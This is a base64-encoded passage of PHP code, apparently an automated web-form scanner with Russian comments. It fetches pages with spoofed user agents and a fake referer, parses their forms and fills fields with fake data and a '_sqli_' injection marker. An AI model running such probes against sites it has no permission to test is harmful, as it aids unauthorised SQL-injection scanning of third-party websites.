zLT5zdHJfcmFuZCg1KTsKCQkJCQkJJHN0ci49JHBwLic9alpzQlN6ZWpBSSYnOwoJCQkJCX0KCQkJCQllbHNlaWYocHJlZ19tYXRjaCgnL2RkcmVzcy9pJywkcHAsJG1hdGgpKQoJCQkJCXsKCQkJCQkJJHIgPSAkdGhpcy0+c3RyX3JhbmQoKTsKCQkJCQkJJHN0ci49JHBwLic9U3RyZWV0bGVueWF1XzEzJy4kci4nJic7CgkJCQkJfQoJCQkJZWxzZWlmKHByZWdfbWF0Y2goJy9tYWlsL2knLCRwcCwkbWF0aCkpCgkJCQkJewoJCQkJCQkkciA9ICR0aGlzLT5zdHJfcmFuZCgpOwoJCQkJCQkkc3RyLj0kcHAuJz1nb29kJy4kci4nQHdlYmdvb2Qub3JnJic7CgkJCQkJfQoJCQkJCWVsc2VpZihwcmVnX21hdGNoKCcvcGhvbmUvaScsJHBwLCRtYXRoKSkKCQkJCQl7CgkJCQkJCSRyID0gcmFuZCgxMDAwMCw5OTk5OSk7CgkJCQkJCSRzdHIuPSRwcC4nPTE5ODIxMScuJHIuJyYnOwoJCQkJCX1lbHNlewoJCQkJCQkKCQkJCQkKCQkJCQkKCQkJCQkJJHN0ci49JHBwLic9X3NxbGlfJic7CgkJCQkJCQoJCQkJCQkKCQkJCQl9CgkJCQkKCQkJCX0KCQkJCgkJCS8vYnJlYWs7CQoJCX0KCQkKCQkkc3RyID0gc3Vic3RyKCRzdHIsMCwtMSk7CgkJJHRoaXMtPmQoJHN0ciwnJHN0cicpOwoJCS8vZXhpdDsJCQoJCSAKCQkgcmV0dXJuICAkc3RyOwoJCQoJfQoJCglwdWJsaWMgZnVuY3Rpb24gZm9ybV9wYWdlX2Z1bGxfcXVlcnkoJGFjdCwkZm9ybV9wb3N0X3F1ZXJ5KXsvL9Cf0L7Qu9C90YvQuSBnZXQgYyBxdWVyeQoJCSRmb3JtX3BhZ2VfZnVsbF9xdWVyeSA9ICRhY3QuJz8nLiRmb3JtX3Bvc3RfcXVlcnk7CgkJcmV0dXJuICRmb3JtX3BhZ2VfZnVsbF9xdWVyeTsKCX0JCgkJCglwdWJsaWMgZnVuY3Rpb24gZm9ybV9wYWdlX3VybCgkdXJsKXsgLy/Qt9Cw0LnRgtC4INC90LAg0YHRgtGA0LDQvdC40YbRgyDQuCDQstC30Y/RgtGMINC60L7QvdGC0LDQutGCIGh0bWwg0Lgg0L7RgtGA0LDQstC40YLRjCDQvdCwINGA0LDRgdC/0LDRgNGB0LjQstCw0L3QuNC1IFdFQl9HRVRfUEFHRQoJCQoJCSR1cmwgPSBzdHJfcmVwbGFjZShhcnJheSgnaHR0cDovLycsJ2h0cHBzOi8vJyksJycsJHVybCk7CgkJCgkJJHRlbXB1cmwgPSBwYXJzZV91cmwoJ2h0dHA6Ly8nLiR1cmwpOwoJCQoJCSR0aGlzLT5mb3JtX2hvc3QgPSAkdGVtcHVybFsnaG9zdCddOwoJCQoJCS8vJHRoaXMtPmQoJHRlbXB1cmwsJyR0ZW1wdXJsJyk7CgkJCgkJJGNoID0gY3VybF9pbml0KCk7IAoJCSRoZWFkZXJzID0gYXJyYXkKCQkoCgkJCSdBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCo7cT0wLjgnLAoJCQknQWNjZXB0LUxhbmd1YWdlOiBydSxlbi11cztxPTAuNyxlbjtxPTAuMycsCgkJCSdBY2NlcHQtQ2hhcnNldDogd2luZG93cy0xMjUxLHV0Zi04O3E9MC43LCo7cT0wLjcnCgkJKTsgCgoJCSAgICAgICR1YWdlbnQgPSBhcnJheSgKIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDUuMTsgcnU7IHJ2OjEuOS4wLjgpIEdlY2tvLzIwMDkwMzI2MDkgRmlyZWZveC8zLjAuOCIsIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGRpYWwiLAkJICAKIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGRpYWw7IEUtbnJneVBsdXM7IC5ORVQgQ0xSIDEuMS40MzIyOyBJbmZvUGF0aC4xKSIsCiJNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA3LjA7IFdpbmRvd3MgTlQgNS4xOyBkaWFsOyBTVjE7IC5ORVQgQ0xSIDEuMC4zNzA1KSIsCiJNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA3LjA7IFdpbmRvd3MgTlQgNS4xOyBkcy02Njg0MzQxMjsgU2dydW50fFYxMDl8MXxTLTY2ODQzNDEyfGRpYWw7IC5ORVQgQ0xSIDEuMS40MzIyKSIsCiJNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA3LjA7IFdpbmRvd3MgTlQgNS4xOyBlTXVzaWMgRExNLzM7IE1TTiBPcHRpbWl6ZWQ7VVM7IE1TTiBPcHRpbWl6ZWQ7VVMpIiwKIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGVsZXJ0eiAyLjQuMDI1OyAuTkVUIENMUiAxLjAuMzcwNTsgLk5FVCBDTFIgMS4xLjQzMjI7IE1lZGlhIENlbnRlciBQQyA0LjApIiwKIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGVsZXJ0eiAyLjQuMTc5WzEyOF07IC5ORVQgQ0xSIDEuMS40MzIyOyAuTkVUIENMUiAyLjAuNTA3Mjc7IC5ORVQgQ0xSIDMuMC4wNDUwNi4zMDsgLk5FVCBDTFIgMy4wLjA0NTA2LjY0OCkiLAoiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNy4wOyBXaW5kb3dzIE5UIDUuMTsgZ2VuZXJpY18wMV8wMTsgSW5mb1BhdGguMSkiLAoiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNy4wOyBXaW5kb3dzIE5UIDUuMTsgZ2VuZXJpY18wMV8wMTsgWVBDIDMuMi4wOyAuTkVUIENMUiAxLjEuNDMyMjsgeXBsdXMgNS4zLjA0YikiLAoiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNy4wOyBXaW5kb3dzIE5UIDUuMTsgaU9wdXMtSS1NOyAuTkVUIENMUiAxLjEuNDMyMikiLAoiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNy4wOyBXaW5kb3dzIE5UIDUuMTsgaWViYXIpIiwKIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGllYmFyOyBJbmZvUGF0aC4yOyAuTkVUIENMUiAxLjEuNDMyMjsgLk5FVCBDTFIgMi4wLjUwNzI3OyAuTkVUIENMUiAzLjAuMDQ1MDYuMzApIiwKIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGllYmFyOyBTZ3J1bnR8VjEwOXwxNzQ2fFMtMTc0MDUzMjkzNHxkaWFsbm87IHNucHJ0enxkaWFsbm87IC5ORVQgQ0xSIDIuMC41MDcyNykiLAoiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNy4wOyBXaW5kb3dzIE5UIDUuMTsgaWViYXI7IGFjYz07IFlQQyAzLjIuMDsgLk5FVCBDTFIgMS4wLjM3MDU7IC5ORVQgQ0xSIDEuMS40MzIyOyBJRU1CMzsgSUVNQjM7IHlwbHVzIDUuMS4wNGIpIiwKIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGllYmFyOyBhY2M9bm9uZTsgRnVuV2ViUHJvZHVjdHM7IC5ORVQgQ0xSIDEuMS40MzIyKSIsCiJNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA3LjA7IFdpbmRvd3MgTlQgNS4xOyBpZWJhcjsgYWNjPW5vbmU7IFNWMTsgc25wcnR6fFMwNDA4NzU0NDgwMjEzNzsgLk5FVCBDTFIgMS4xLjQzMjIpIiwKIk1vemlsbGEvNC4wIChjb21wYXRpYmxlOyBNU0lFIDcuMDsgV2luZG93cyBOVCA1LjE7IGllYmFyOyB5cGx1cyA1LjYuMDJiKSIpOwoJCQoJCSAgLy8v0YDQsNC90LTQvtC80L3Ri9C1INC30L3QsNGH0LXQvdC40Y8KCQkKCQkgICR1YSA9IHRyaW0oJHVhZ2VudFttdF9yYW5kKDAsc2l6ZW9mKCR1YWdlbnQpLTEpXSk7CQoJCQoJCWlmKCR0aGlzLT5odHRwcykKCQl7CgkJCSR1cmxfbmV3ID0gJ2h0dHBzOi8vJy4kdXJsOwoJCX1lbHNlCgkJewoJCQkkdXJsX25ldyA9ICdodHRwOi8vJy4kdXJsOwoJCX0KCQkKCQkvLyR0aGlzLT5kKCR1cmxfbmV3LCckdXJsX25ldyAxJyk7CgkJY3VybF9zZXRvcHQoICRjaCwgQ1VSTE9QVF9IVFRQSEVBREVSLCRoZWFkZXJzKTsgCgkJY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9VUkwsJHVybF9uZXcpOwoJCWN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfSEVBREVSLCAxKTsKCQljdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsgCgkJY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7CgkJY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9GQUlMT05FUlJPUiwgMSk7IC8vIEZhaWwgb24gZXJyb3JzCgkJY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9DT05ORUNUVElNRU9VVCwgMjApOwoJCWN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfUkVGRVJFUiwgImh0dHA6Ly9nb29nbGUuY29tIik7CgkJY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICR1YSk7CgkJY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9DT09LSUVGSUxFLCAnY29vLnR4dCcpOyAKCQljdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX0NPT0tJRUpBUiwgJ2Nvby50eHQnKTsgCgkJJGNvbiA9IGN1cmxfZXhlYygkY2gpOyAKCQkKCQljdXJsX2Nsb3NlICgkY2gpOwoJCQoJCS8vJHRoaXMtPmQoJGNvbiwnJGNvbiAxJyk7CgkJLy9leGl0OwoJCQoJCXJldHVybiAkY29uOwoJCQoJCQoJCQoJCQoJCgl9CgkKCXB1YmxpYyBmdW5jdGlvbiBmb3JtX3NlYXJjaCgkY29udCl7IC8v0LPQu9Cy0L3QsNGPINC/0L4g0L/QvtC70YPRh9C10L3QuNGOINGE0L7RgNC80YsKCQkKCQkkZmluZF9mb3JtID0gJHRoaXMtPnBhZ2VfYW5hbGl6ZSgndXRmLTgnLCRjb250KTsKCQkKCQkvLyR0aGlzLT5kKCRmaW5kX2Zvcm0sJyRmaW5kX2Zvcm0nKTsKCQkKCQlpZihjb3VudCgkZmluZF9mb3JtKSA+MCkKCQl7CgkJCQoJCQlmb3JlYWNoKCRmaW5kX2Zvcm0gYXMgJGZpbmRfZm9ybV9vbmUpCgkJCXsKCQkJCSRmaW5kX2Zvcm1fb25lID0gJzxmb3JtJy4kZmluZF9mb3JtX29uZS4nPC9mb3JtPic7CgkJCQkvLyR0aGlzLT5kKCRmaW5kX2Zvcm1fb25lLCckZmluZF9mb3JtX29uZScpOwkJCgkJCQkJCgkJCQkKCQkJCSRnZXRfZm9ybSA9IG5ldyBIdG1sRm9ybVBhcnNlcigkZmluZF9mb3JtX29uZSk7CgkJCQkvLyR0aGlzLT5kKCRnZXRfZm9ybSwnJGdldF9mb3JtJyk7CgkJCQkKCQkJCQoJCQkJCgkJCQkkZm9ybV9pbiA9ICRnZXRfZm9ybS0+cGFyc2VGb3JtcygpOwoJCQkJLy8kdGhpcy0+ZCgkZm9ybV9pbiwnJGZvcm1faW4nKTsKCQkJCQoJCQkJCgkJCQlpZihjb3VudCgkZm9ybV9pbik+MCkKCQkJCXsKCQkJCQkKCQkJCQkKCQkJCQlyZXR1cm4gJGZvcm1faW47CgkJCQl9ZWxzZXsKCQkJCQlyZXR1cm4gZmFsc2U7CgkJCQl9CgkJCX0JCgkJfQoJCQoJCQoJfQoJCglwdWJsaWMgZnVuY3Rpb24gcGFnZV9hbmFsaXplKCRjaGFyc2V0X2h0dHAsJiRjb250ZW50KXsvL9C40YnQtdC8INGE0L7RgNC80Ysg0L3QsCDRgdGC0YDQsNC90LjRhtC1CQoJCgoJLy8xLiDQv9C10YDQtdCy0L7QtNC40Lwg0LrQvtC00LjRgNC+0LLQutGDINCyIHV0Zi04CgkkY2hhcnNldD0oJHRoaXMtPmNoYXJzZXRfa25vd24oJGNoYXJzZXRfaHR0cCk/JGNoYXJzZXRfaHR0cDpmYWxzZSk7CgkkY2hhcnNldF9tZXRhPWZhbHNlOy8v0YHRjtC00LAg0L/QvtC80LXRgdGC0LjQvCDRg9C60LDQt9Cw0L3QvdGD0Y4KCSR0aGlzLT5odG1sX21pbmltaXplKCRjb250ZW50KTsKCSRsb3dlcj1zdHJ0b2xvd2VyKCRjb250ZW50KTsKCSRlPWV4cGxvZGUoJzxtZXRhICcsJGxvd2VyKTsvLzxtZXRhIGh0dHAtZXF1aXY9ImNvbnRlbnQtdHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Ij4KCQoJaWYoY291bnQoJGUpPjEpCgkJewoJCQl1bnNldCgkZVswXSk7Ly/Qt9C00LXRgdGMINC10ZEg0YLQvtGH0L3QviDQvdC10YIKCQkJZm9yZWFjaCgkZSBhcyAmJG1ldGEpCgkJCXsKCQkJCSRwPXN0cnBvcygkbWV0YSwnPicpOwoJCQkJaWYoZmFsc2UhPT0kcCkKCQkJCXsKCQkJCQkkbWV0YT1zdWJzdHIoJG1ldGEsMCwkcCk7Ly9odHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIKCQkJCSBpZigoZmFsc2UhPT1zdHJwb3MoJG1ldGEsJ2NvbnRlbnQtdHlwZScpKSYmKGZhbHNlIT09c3RycG9zKCRtZXRhLCdodHRwLWVxdWl2PScpKSkKCQkJCQl7CgkJCQkJCSRtZXRhX2NvbnRlbnQ9JHRoaXMtPmdldF9hdHRyX3ZhbHVlKCRtZXRhLCdjb250ZW50Jyk7Ly90ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgKCQkJCQkJaWYoZmFsc2UhPT0kbWV0YV9jb250ZW50KQoJCQkJCQl7CgkJCQkJCQkkY2hhcnNldF9tZXRhPSR0aGlzLT5nZXRfYXR0cl92YWx1ZSgkbWV0YV9jb250ZW50LCdjaGFyc2V0Jyk7Ly90ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgKCQkJCQkJCQoJCQkJCQkJaWYoZmFsc2UhPT0kY2hhcnNldF9tZXRhKQoJCQkJCQkJewoJCQkJCQkJCWlmKCR0aGlzLT5jaGFyc2V0X2tub3duKCRjaGFyc2V0X21ldGEpKQoJCQkJCQkJCXsKCQkJCQkJCQkJJGNoYXJzZXQ9JGNoYXJzZXRfbWV0YTsKCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJfTsKCQkJCQkJCX07CgkJCQkJCX07CgkJCQkJfQoJCQkJZWxzZWlmKChmYWxzZSE9PXN0cnBvcygkbWV0YSwnY2hhcnNldCcpKSkKCQkJCQl7CgkJCQkJCSRjaGFyc2V0X21ldGE9JHRoaXMtPmdldF9hdHRyX3ZhbHVlKCRtZXRhLCdjaGFyc2V0Jyk7Ly9jaGFyc2V0PSJ1dGYtOCIKCQkJCQkJaWYoZmFsc2UhPT0kY2hhcnNldF9tZXRhKQoJCQkJCQkJewoJCQkJCQkJCWlmKCR0aGlzLT5jaGFyc2V0X2tub3duKCRjaGFyc2V0X21ldGEpKQoJCQkJCQkJCXsKCQkJCQkJCQkJJGNoYXJzZXQ9JGNoYXJzZXRfbWV0YTsKCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJfTsKCQkJCQkJCX07CgkJCQkJfTsKCQkJCX07CgkJCX07CgkJdW5zZXQoJG1ldGEpOwoJCX07Cgl1bnNldCgkZSk7CgoKCS8v0LXRgdC70Lgg0L3QsNGI0LvQuCDQutC+0LTQuNGA0L7QstC60YMsINC+0L3QsCDQuNC30LLQtdGB0YLQvdCwINC4INC+0L3QsCDQvdC1IHV0Zi04LCDRgtC+INC/0LXRgNC10LLQvtC00LjQvCDQsiB1dGYtOAoJaWYoKGZhbHNlIT09JGNoYXJzZXQpJiYoJ3V0Zi04JyE9PSRjaGFyc2V0KSkKCXsKCQkkY29udGVudD1AaWNvbnYoJGNoYXJzZXQsJ3V0Zi04JywkY29udGVudCk7CgkJJGxvd2VyPXN0cnRvbG93ZXIoJGNvbnRlbnQpOwoJCgl9OwoJCgkvLyR0aGlzLT5kKCRsb3dlciwnJGxvd2VyJyk7CgkKCgkvLzIuINC40YnQtdC8INGE0L7RgNC80YMKCS8vYWxyZWFkeSAtIGh0bWxfbWluaW1pemUoJGxvd2VyKTsKCSRmb3Jtcz1hcnJheSgpOwoJJGU9ZXhwbG9kZSgnPGZvcm0nLCRsb3dlcik7CgkKCQoJaWYoY291bnQoJGUpPjEpCgl7CgkJdW5zZXQoJGVbMF0pOy8v0LfQtNC10YHRjCDQtdGRINGC0L7Rh9C90L4g0L3QtdGCXAoJCQoJCQoJCWZvcmVhY2goJGUgYXMgJGZvcm0pCgkJewoJCQkkZTI9ZXhwbG9kZSgnPC9mb3JtPicsJGZvcm0sMyk7CgkJCQoJCQkvLyR0aGlzLT5kKCRlMiwnJGUyJyk7CgkJCQoJCQlpZihjb3VudCgkZTIpID49MSkKCQkJewoJCQkJLy9pZighJHRoaXMtPmZvcm1faXNfc2VhcmNoKCRlMlswXSkpCgkJCQkvL3sKCQkJCQkkZm9ybXNbXT0kZTJbMF07CgkJCQkvL307CgkJCX0KCQl9OwoJfTsKCQoJCgkJdW5zZXQoJGUpOwoJCQoJCS8vJHRoaXMtPmQoJGZvcm1zLCckZm9ybXMnKTsJCgkKCQlyZXR1cm4gJGZvcm1zOwoJfQoKCXB1YmxpYyBmdW5jdGlvbiBodG1sX21pbmltaXplKCYkcyl7CgkJJHRoaXMtPnNwYWNlcigkcyk7CgkJc3RhdGljICRmPWFycmF5KCc+ICcsJyA+JywnPCAnLCcgPCcsJy8+JywnPD4nLCc9ICcsJyA9JywpOwoJCXN0YXRpYyAkdD1hcnJheSgnPicgLCAnPicsJzwnICwgJzwnLCAnPicsJycgICwnPScgLCc9JyAsKTsKCQkkbD1zdHJsZW4oJHMpOwoJCWRvewoJCQkkbF89JGw7CgkJCSRzPXN0cl9yZXBsYWNlKCRmLCR0LCRzKTsKCQkJJGw9c3RybGVuKCRzKTsKCQl9d2hpbGUoJGw8JGxfKTsKCX0KCglwdWJsaWMgZnVuY3Rpb24gc3BhY2VyKCYkcyl7Ly/Qt9Cw0LzQtdC90Y/QtdGCINCy0YHQtSDQv9GA0L7QsdC10LvRjNC90YvQtSDRgdC40LzQstC+0LvRiyDQvdCwINC/0YDQvtCx0LXQu9GLLiDQldGB0LvQuCDQv9GA0L7QsdC10LvQvtCyINC90LXRgdC60L7Qu9GM0LrQviDQv9C+0LTRgNGP0LQgLSDQt9Cw0LzQtdC90Y/QtdGCINC+0LTQvdC40LwuCgkJc3RhdGljICRmPWFycmF5KCJcdCIsIlxuIiwiXHIiLCJcdiIsJyZuYnNwOycsJzxicj4nKTsKCQlzdGF0aWMgJHQ9YXJyYXkoJyAnLCcgJywnICcsJyAnLCcgJywnICcpOwoJCSRzPXN0cl9yZXBsYWNlKCRmLCR0LCRzKTsKCQkkcz10cmltKCRzKTsKCQkkbD1zdHJsZW4oJHMpOwoJCWRvCgkJewoJCQkkbF89JGw7CgkJCSRzPXN0cl9yZXBsYWNlKCcgICcsJyAnLCRzKTsKCQkJJGw9c3RybGVuKCRzKTsKCQl9d2hpbGUoJGw8JGxfKTsKCX0JCgoJcHVibGljIGZ1bmN0aW9uIGlubmVyVGV4dCgkaW4pey8v0L3QvtGA0LzQsNC70LjQt9C+0LLQsNC90L3Ri9C5IGh0bWxfbWluaW1pemUoJGluKQoJCXN0YXRpYyAkbm9fc3BhY2VfdGFncz1hcnJheSgnYicsJ2knLCd1JywncycsJ2JpZycsJ3NwYW4nLCdmb250Jywnc21hbGwnLCdzdHJvbmcnKTsKCQkkZT1leHBsb2RlKCc8JywkaW4pOwoJCSR0PSRlWzBdOwoJCXVuc2V0KCRlWzBdKTsKCQkKCQlpZihjb3VudCgkZSk+MCkKCQkJewoJCQkJZm9yZWFjaCgkZSBhcyAmJHMpCgkJCQl7CgkJCQkJJGUyPWV4cGxvZGUoJz4nLCRzLDIpOwoJCQkJCSRjPWNvdW50KCRlMik7CgkJCQkJCgkJCQkJaWYoJGM+MCkKCQkJCQl7CgkJCQkJCQkvL9Cy0YvRj9GB0L3Rj9C10Lwg0YLQsNCzCgkJCQkJCQkkdGFnPSRlMlswXTsKCQkJCQkJCSRwPXN0cnBvcygkdGFnLCcgJyk7CgkJCQkJCQoJCQkJCQlpZihmYWxzZSE9PSRwKQoJCQkJCQl7CgkJCQkJCQkkdGFnPXN1YnN0cigkdGFnLDAsJHApOwoJCQkJCQl9OwoJCQkJCQkKCQkJCQkJLy8g0L/RgNC+0LLQtdGA0Y/QtdC8INGC0LXQs9C4LCDQutC+0YLQvtGA0YvQtSDQvdC1INC90LDQtNC+INC+0YLQtNC10LvRj9GC0Ywg0L/RgNC+0LHQtdC70LDQvNC4CgkJCQkJCWlmKCFpbl9hcnJheShzdHJ0b2xvd2VyKCR0YWcpLCRub19zcGFjZV90YWdzKSkKCQkJCQkJewoJCQkJCQkJJHQuPScgJzsKCQkJCQkJfTsKCQkJCQkJCgkJCQkJCWlmKGlzc2V0KCRlMlsxXSkpCgkJCQkJCXsKCQkJCQkJCSR0Lj0kZTJbMV07CgkJCQkJCX07CgkJCQkJfQoJCQkJCWVsc2UKCQkJCQl7CgkJCQkJCS8v0YLQsNCzINC90LUg0LfQsNC60YDRi9GCCgkJCQkJfTsJCgkJCQl9OwoJCQl9OwoJCSR0aGlzLT5zcGFjZXIoJHQpOwoJCXJldHVybiAkdDsKCX0KCglwdWJsaWMgZnVuY3Rpb24gY2hhcnNldF9rbm93bigmJGNoYXJzZXQpewoJCQoJc3RhdGljICRjcz1hcnJheSgKCS8vVW5pY29kZToKCQkndXRmLTgnLCd1Y3MyLWludGVybmFsJywnaXNvLTEwNjQ2LXVjcy0yJywndW5pY29kZS0xLTEtdXRmLTcnLAoJLy9FVUM6CgkJJ2V1Yy1qcCcsJ2diMjMxMicsJ2V1Yy1rcicsJ3gtZXVjLXR3JywKCS8vSVNPLTIwMjI6CgkJJ2lzby0yMDIyLWNuJywnaXNvLTIwMjItanAnLCdpc28tMjAyMi1rcicsJ2lzby0yMDIyLWpwLTInLAoJLy9JU086CgkJJ3VzLWFzY2lpJywnaXNvLTg4NTktMScsJ2lzby04ODU5LTInLCdpc28tODg1OS0zJywnaXNvLTg4NTktNCcsCgkJJ2lzby04ODU5LTUnLCdpc28tODg1OS02JywnaXNvLTg4NTktNycsJ2lzby04ODU5LTgnLCdpc28tODg1OS05JywKCQknaXNvLTg4NTktMTAnLCdpc28tODg1OS0xMycsJ2lzby04ODU5LTE0JywnaXNvLTg4NTktMTUnLAoJLy9LT0k6CgkJJ2tvaTgtcicsJ2tvaTgtdScsJ3gta29pOC1ydScsCgkvL1dpbmRvd3M6CgkJJ3dpbmRvd3MtMTI1MCcsJ3dpbmRvd3MtMTI1MScsJ3dpbmRvd3MtMTI1MicsJ3dpbmRvd3MtMTI1MycsCgkJJ3dpbmRvd3MtMTI1NCcsJ3dpbmRvd3MtMTI1NScsJ3dpbmRvd3MtMTI1NicsJ3dpbmRvd3MtMTI1NycsCgkJJ3dpbmRvd3MtMTI1OCcsJ2NwODc0JywnY3A5MzInLCdjcDkzNicsJ2NwOTQ5JywnY3A5NTAnLAoJLy9JQk0tRE9TOgoJCSdjcDQzNycsJ2NwNzM3JywnY3A3NzUnLCdjcDg1MCcsJ2NwODUyJywnY3A4NTUnLCdjcDg1NycsJ2NwODYwJywKCQknY3A4NjEnLCdjcDg2MicsJ2NwODYzJywnY3A4NjQnLCdjcDg2NScsJ2NwODY2JywnY3A4NjknLCdjcDg3NCcsCgkvL0FwcGxlOgoJCSd4LW1hYy1jZScsJ3gtbWFjLWNyb2F0aWFuJywneC1tYWMtY3lyaWxsaWMnLCd4LW1hYy1kaW5nYmF0cycsCgkJJ3gtbWFjLWdyZWVrJywneC1tYWMtaWNlbGFuZCcsJ3gtbWFjLXJvbWFuJywneC1tYWMtcm9tYW5pYScsCgkJJ3gtbWFjLXRoYWknLCd4LW1hYy10dXJraXNoJywneC1tYWMtdWtyYWluZScsCgkvL0NKSzoKCQknYmlnNScsJ2NuczExNjQzJywnZ2JfMjMxMi04MCcsJ2diMTIzNDUnLCdqb2hhYicsJ2tzeDEwMDEnLAoJCSdzaGlmdF9qaXMnLCdqaXNfeDAyMDEnLCdqaXNfeDAyMDgtMTk4MycsJ2ppc194MDIxMi0xOTkwJywKCQkpOwoJCSRjaGFyc2V0PXN0cnRvbG93ZXIoJGNoYXJzZXQpOwoJCXJldHVybiBpbl9hcnJheSgkY2hhcnNldCwkY3MsdHJ1ZSk7Cgl9CgkJCglwdWJsaWMgZnVuY3Rpb24gZ2V0X2F0dHJfdmFsdWUoJHMsJGF0dHIpey8v0L/QvtC70YPRh9C40YLRjCDQt9C90LDRh9C10L3QuNC1IGh0bWwt0LDRgtGC0YDQuNCx0YPRgtCwLiBodG1sINC0LtCxLiDQvdC+0YDQvNCw0LvQuNC30L7QstCw0L0gKNC80LjQvdC40LzQuNC30LjRgNC+0LLQsNC9KQoJCSRyPWZhbHNlOwoJCSRuPSRhdHRyLic9JzsKCQkkcD1zdHJpcG9zKCRzLCRuKTsKCQkKCQlpZihmYWxzZSE9PSRwKQoJCXsKCQkJJHM9c3Vic3RyKCRzLCRwK3N0cmxlbigkbikpOwoJCQlpZignJz09JHMpeyRzPScnO3JldHVybiAkczt9OwoKCQkJJHE9ZmFsc2U7CgkJCQoJCQlpZignIic9PT0kc1swXSkKCQkJewoJCQkJJHE9JyInOwoJCQkJJHM9c3Vic3RyKCRzLDEpOwoJCQl9CgkJCWVsc2VpZignXCcnPT09JHNbMF0pCgkJCXsKCQkJCSRxPSdcJyc7CgkJCQkkcz1zdWJzdHIoJHMsMSk7CgkJCX07CgkJCQoJCQlpZignJz09JHMpeyRzPScnO3JldHVybiAkczt9OwoJCQkKCQkJaWYoZmFsc2U9PT0kcSkKCQkJewoJCQkJJHA9c3RycG9zKCRzLCcgJyk7CgkJCQlpZihmYWxzZT09PSRwKQoJCQkJewoJCQkJCSRyPSRzOwoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCSRyPXN1YnN0cigkcywwLCRwKTsKCQkJCQlpZignJz09JHIpeyRyPScnO30KCQkJCX07CgkJCX0KCQkJZWxzZQoJCQl7CgkJCQkkcD1zdHJwb3MoJHMsJHEpOwoJCQkJCgkJCQlpZihmYWxzZT09PSRwKQoJCQkJewoJCQkJCSRyPSRzOwoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCSRyPXN1YnN0cigkcywwLCRwKTsKCQkJCQlpZignJz09JHIpeyRyPScnO30KCQkJCX07CgkJCX07CgkJfTsJCQkJCgkJcmV0dXJuICRyOwoJfQoJCQoJcHVibGljIGZ1bmN0aW9uIHN0cl9yYW5kKCRsZW5ndGg9NSl7CgkJCgkJJGxldHRlcnMgPSAncXdlcnR5dWlvcGFzZGZnaGprbHp4Y3Zibm1RV0VSVFlVSU9QQVNERkdISktMWlhDVkJOTTEyMzQ1Njc4OTAnOwoJJHdvcmRfbGVuZ2h0ID0gNTsKCSRzaXplX2xldHRlcnMgPSBzdHJsZW4oJGxldHRlcnMpLTE7Cglmb3IoJGk9MDskaTw1OyRpKyspewoJd2hpbGUoJHdvcmRfbGVuZ2h0LS0pewoJJHBhc3MuPSRsZXR0ZXJzW3JhbmQoMCwkc2l6ZV9sZXR0ZXJzKV07Cgl9Cgkkd29yZF9sZW5naHQgPSA1OwoJJHBhc3N3b3JkID0kcGFzczsKCSRwYXNzID0gJyc7Cgl9CgkkcGFzc3dvcmQgPSBzdWJzdHIoJHBhc3N3b3JkLDAsc3RybGVuKCRwYXNzd29yZCktMSk7CglyZXR1cm4gJHBhc3N3b3JkOwoKCX0JCgkJCglwdWJsaWMgZnVuY3Rpb24gZm9ybV9pc19zZWFyY2goJGZvcm0pewoJCS8vZWNobyBwcmUoJGZvcm0sJyRmb3JtLy9mb3JtX2lzX3NlYXJjaCgpJyk7CgkJJHA9c3RycG9zKCRmb3JtLCdzZWFyY2gnKTsKCQlyZXR1cm4oZmFsc2UhPT0kcCk7CgoJfQkKCQoJCgkvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLwoJLy8vLy8vLy8v0JDQm9CT0J7QoNCY0